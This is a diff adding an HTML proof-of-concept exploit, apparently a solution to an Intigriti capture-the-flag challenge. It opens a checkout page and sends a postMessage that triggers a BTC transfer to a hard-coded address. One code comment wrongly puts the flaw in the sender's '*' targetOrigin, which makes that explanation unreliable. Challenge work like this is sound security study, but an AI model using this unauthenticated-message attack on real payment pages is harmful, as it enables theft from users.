@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PoC Exploit</title>
+</head>
+<body>
+    <h1>Processing Review...</h1>
+    <script>
+        // 1. Open the target page
+        const targetUrl = "https://challenge-0126.intigriti.io/checkout.html?currency=BTC&price=1";
+        const vulnWindow = window.open(targetUrl, "_blank");
+
+        // 2. Wait for the page to load, then fire the exploit
+        setTimeout(() => {
+            if (vulnWindow) {
+                vulnWindow.postMessage({
+                    type: 'submitTransaction',
+                    transaction: {
+                        toAddress: '180b9cfb3f61dbba06886cc2c90b3e7af5', // Use your actual address
+                        currency: 'BTC',
+                        amount: 1.337
+                    }
+                }, '*'); // The '*' targetOrigin is what makes this an exploit
+                console.log("Exploit payload delivered.");
+            } else {
+                console.error("Popup blocked or window failed to open.");
+            }
+        }, 3000); // 3 seconds is usually enough for the bot's environment
+    </script>
+</body>
+</html>
